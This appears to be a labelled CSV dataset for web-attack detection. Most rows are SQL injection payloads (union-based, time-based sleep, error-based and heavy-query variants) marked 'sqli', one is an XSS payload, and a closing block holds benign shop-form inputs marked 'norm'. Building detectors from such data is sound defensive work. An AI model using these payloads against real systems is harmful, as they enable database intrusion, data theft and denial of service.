"payload","length","attack_type","label"
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)","234","sqli","anom"
"1%"") union all select null#","27","sqli","anom"
"1' where 3362=3362;iif(5257=5257,1,1/0)","39","sqli","anom"
"-6600') union all select 5566,5566#","35","sqli","anom"
"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'bxjo' like 'bxjo","125","sqli","anom"
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)# mafe","137","sqli","anom"
"1 where 7021=7021 or 6793=(select 6793 from pg_sleep(5))--","58","sqli","anom"
"-5235) or make_set(9354=9354,7185)","34","sqli","anom"
"1 and 7533=7533","15","sqli","anom"
"1%'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('%'='","251","sqli","anom"
"-6109 union all select 6784--","29","sqli","anom"
"1) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","100","sqli","anom"
"1))) or sleep(5) and (((2209=2209","33","sqli","anom"
"1%') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","142","sqli","anom"
"1"")));waitfor delay '0:0:5'--","29","sqli","anom"
"1') waitfor delay '0:0:5' and ('fpnh'='fpnh","43","sqli","anom"
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('hryb'='hryb","131","sqli","anom"
"1"") as hfgk where 1100=1100 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","136","sqli","anom"
"1"" where 9829=9829 order by 1#","30","sqli","anom"
"1') as nmzp where 3794=3794 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","180","sqli","anom"
"1') where 7887=7887 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--","113","sqli","anom"
"-9572%"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""","214","sqli","anom"
"1"");begin user_lock.sleep(5); end--","35","sqli","anom"
"1) order by 1--","15","sqli","anom"
"1%""))) and (3502=7893)*7893 and (((""%""=""","40","sqli","anom"
"-8448%"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""","219","sqli","anom"
"-2319 union all select 5068,5068,5068#","38","sqli","anom"
"1' where 1085=1085 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","120","sqli","anom"
"1%"")) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","112","sqli","anom"
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#","69","sqli","anom"
"-8425"")) or (6485=1127)*1127 and ((""qruf""=""qruf","47","sqli","anom"
"1%') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('%'='","217","sqli","anom"
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'tmwy'='tmwy","175","sqli","anom"
"1 rlike (select * from (select(sleep(5)))sgvo)# ewsz","52","sqli","anom"
"1') where 9304=9304 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","81","sqli","anom"
"1%') and 2006=2006","18","sqli","anom"
"1"");select (case when (2676=4191) then 2676 else 1/(select 0) end)--","68","sqli","anom"
"1') as wtfo where 5666=5666 union all select null,null,null,null--","66","sqli","anom"
"1') where 9538=9538;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--","113","sqli","anom"
"1"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""vnei"" like ""vnei","67","sqli","anom"
"-4236') union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#","75","sqli","anom"
"1)) as rcbz where 4563=4563 and 2006=2006","41","sqli","anom"
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'xqkq'='xqkq","112","sqli","anom"
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""zyoo""=""zyoo","159","sqli","anom"
"-8773%'))) union all select 8941,8941,8941,8941,8941,8941#","58","sqli","anom"
"1%""))) union all select null,null,null,null,null,null--","55","sqli","anom"
"1))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","112","sqli","anom"
"1'))) rlike sleep(5) and ((('zwyx'='zwyx","40","sqli","anom"
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""mezx"" like ""mezx","226","sqli","anom"
"1"") as tqxa where 6751=6751 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","184","sqli","anom"
"1%';select benchmark(5000000,md5(0x4c4d6142)) and '%'='","55","sqli","anom"
"1%'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('%'='","112","sqli","anom"
"1))) and 8635=(select count(*) from generate_series(1,5000000))--","65","sqli","anom"
"-1684""))) union all select 7473,7473#","37","sqli","anom"
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))","92","sqli","anom"
"1) where 3671=3671;(select * from (select(sleep(5)))srmq)--","59","sqli","anom"
"1%"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""%""=""","75","sqli","anom"
"1%'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","115","sqli","anom"
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","90","sqli","anom"
"1))) or 6793=(select 6793 from pg_sleep(5)) and (((3919=3919","60","sqli","anom"
"-1219') or 5592=4835","20","sqli","anom"
"1') as kgnd where 1550=1550 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--","90","sqli","anom"
"1'+(select ksoh where 6339=6339;begin dbms_lock.sleep(5); end)+'","64","sqli","anom"
"-8636'))) or 4301=7212--","24","sqli","anom"
"1%"" rlike sleep(5) and ""%""=""","28","sqli","anom"
"1' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","105","sqli","anom"
"1') where 8128=8128;select (case when (4061=1396) then 4061 else 1/(select 0) end)--","84","sqli","anom"
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ckpm'='ckpm","120","sqli","anom"
"1' in boolean mode) and (select * from (select(sleep(5)))gcrr)#","63","sqli","anom"
"-1436' or 5699=5783--","21","sqli","anom"
"1))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((9548=9548","202","sqli","anom"
"1 and make_set(8403=8403,8899)","30","sqli","anom"
"-4419%"")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","140","sqli","anom"
"1')));(select * from (select(sleep(5)))srmq) and ((('pfle' like 'pfle","69","sqli","anom"
"1))) order by 1--","17","sqli","anom"
"1') rlike sleep(5) and ('qsub' like 'qsub","41","sqli","anom"
"-1606'||(select 'qbaa' where 3967=3967 union all select 3967,3967,3967,3967,3967--","82","sqli","anom"
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""uvzc"" like ""uvzc","145","sqli","anom"
"1%') union all select null,null,null,null,null,null,null,null,null,null#","72","sqli","anom"
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('ojkd'='ojkd","111","sqli","anom"
"-6194"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","208","sqli","anom"
"1);begin user_lock.sleep(5); end and (4610=4610","47","sqli","anom"
"1'))) and elt(2506=2383,2383) and ((('bjrj'='bjrj","49","sqli","anom"
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('adnz'='adnz","225","sqli","anom"
"1))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6265=6265","82","sqli","anom"
"1"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)","98","sqli","anom"
"1'+(select lgkd where 7801=7801 and elt(4249=4249,7259))+'","58","sqli","anom"
"1'||(select 'npdx' from dual where 9486=9486 and sleep(5))||'","61","sqli","anom"
"1%') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('%'='","105","sqli","anom"
"-9509) union all select 1193,1193,1193#","39","sqli","anom"
"1' in boolean mode) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#","216","sqli","anom"
"1"" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)","142","sqli","anom"
"1%' or 8466=benchmark(5000000,md5(0x694a4745)) and '%'='","56","sqli","anom"
"1) as oblq where 2002=2002 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--","119","sqli","anom"
"1'+(select 'ycvl' where 8415=8415 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","142","sqli","anom"
"1%"") or 8156=(select count(*) from generate_series(1,5000000))--","64","sqli","anom"
"1);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#","86","sqli","anom"
"location=?javascript:alert(1)>click","35","xss","anom"
"1%""));iif(7011=2522,1,1/0)","26","sqli","anom"
"1) where 9469=9469 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","160","sqli","anom"
"1"") and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""otgh"" like ""otgh","207","sqli","anom"
"-7574%"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""","214","sqli","anom"
"1"") where 4913=4913;begin user_lock.sleep(5); end--","51","sqli","anom"
"-7531') union all select 3072,3072,3072,3072,3072,3072,3072--","61","sqli","anom"
"1 union all select null,null,null,null,null,null--","50","sqli","anom"
"-4869%' union all select 5729,5729,5729--","41","sqli","anom"
"1"" rlike (select * from (select(sleep(5)))vwyq)#","48","sqli","anom"
"-3613%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'='","250","sqli","anom"
"1'+(select 'myrb' where 3622=3622 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'","187","sqli","anom"
"1') union all select null,null,null,null,null,null,null,null,null#","66","sqli","anom"
"-5863"" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""gkvy""=""gkvy","254","sqli","anom"
"1 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","110","sqli","anom"
"1"")) as ljhz where 2416=2416;begin dbms_lock.sleep(5); end--","60","sqli","anom"
"1%""))) and (select * from (select(sleep(5)))gcrr)#","50","sqli","anom"
"-8550"") or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""kyad""=""kyad","205","sqli","anom"
"1)) as emtf where 3561=3561 or (select * from (select(sleep(5)))ydpu)--","71","sqli","anom"
"1' in boolean mode) union all select null,null#","47","sqli","anom"
"1'))) union all select null,null#","33","sqli","anom"
"1') as sjmt where 6541=6541 or 8421=(select count(*) from generate_series(1,5000000))--","87","sqli","anom"
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""bkrk""=""bkrk","189","sqli","anom"
"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--","65","sqli","anom"
"1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'sqvt' like 'sqvt","118","sqli","anom"
"1' where 9416=9416;begin user_lock.sleep(5); end--","50","sqli","anom"
"1))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((9255=9255","171","sqli","anom"
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""egzm""=""egzm","111","sqli","anom"
"1 where 7038=7038;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--","115","sqli","anom"
"1"") as kzuq where 4259=4259;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","88","sqli","anom"
"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('aatp'='aatp","107","sqli","anom"
"1 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","63","sqli","anom"
"1'))) and 7533=7533 and ((('suzd' like 'suzd","44","sqli","anom"
"1"")));select case when 7717=7717 then 1 else null end--","55","sqli","anom"
"1') union all select null,null,null,null,null,null,null#","56","sqli","anom"
"1'+(select 'iqxn' where 1146=1146 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+'","217","sqli","anom"
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","102","sqli","anom"
"1') as sjij where 8659=8659;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","128","sqli","anom"
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((('%'='","105","sqli","anom"
"1"") as eomu where 6599=6599;select * from generate_series(9167,9167,case when (9167=2273) then 1 else 0 end) limit 1--","118","sqli","anom"
"vino rioja","10","norm","norm"
"aadir al carrito","16","norm","norm"
"d1se3cin","8","norm","norm"
"credenciales incorrectas","24","norm","norm"
"pasar por caja","14","norm","norm"
"40a5e","5","norm","norm"
"tarpey@bwds.ne","14","norm","norm"
"tronchn","7","norm","norm"
"1527409541807001","16","norm","norm"
"de_la","5","norm","norm"
"canella","7","norm","norm"
"calle palencia s/n","18","norm","norm"
"madrid","6","norm","norm"
"magrath","7","norm","norm"
"958","3","norm","norm"
"gina","4","norm","norm"
"61877469v","9","norm","norm"
"08880","5","norm","norm"
"misczak","7","norm","norm"
"fredes damas","12","norm","norm"
"camio canexa 161 11?g","21","norm","norm"
"burgos","6","norm","norm"
"81","2","norm","norm"
"6429","4","norm","norm"
"clodoveo","8","norm","norm"
"00792659x","9","norm","norm"
"26329","5","norm","norm"
"pacon","5","norm","norm"
"maurici garrudo","15","norm","norm"
